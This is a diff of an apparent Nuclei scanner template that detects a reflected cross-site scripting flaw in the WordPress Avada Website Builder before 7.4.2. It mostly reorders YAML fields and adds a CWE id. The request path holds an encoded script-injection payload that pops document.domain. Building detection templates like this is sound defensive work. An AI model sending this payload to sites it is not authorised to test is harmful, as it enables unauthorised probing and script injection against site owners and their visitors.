@@ -1,5 +1,4 @@
 id: avada-xss
-
 info:
   name: WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting
   author: Akincibor
@@ -11,31 +10,26 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-79
+    cwe-id: CWE-79,CWE-80
   metadata:
     max-request: 1
-  tags: xss,wp,wordpress,wp-theme,avada,wpscan,vuln
-
+  tags: avada,vuln,wordpress,wp,wp-theme,wpscan,xss
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/'
-
-    matchers-condition: and
-    matchers:
-      - type: word
+  - matchers:
+      - condition: and
         part: body
+        type: word
         words:
           - '"></script><script>alert(document.domain)</script>'
-          - 'avada-footer-scripts'
-        condition: and
-
-      - type: word
-        part: header
+          - avada-footer-scripts
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/'
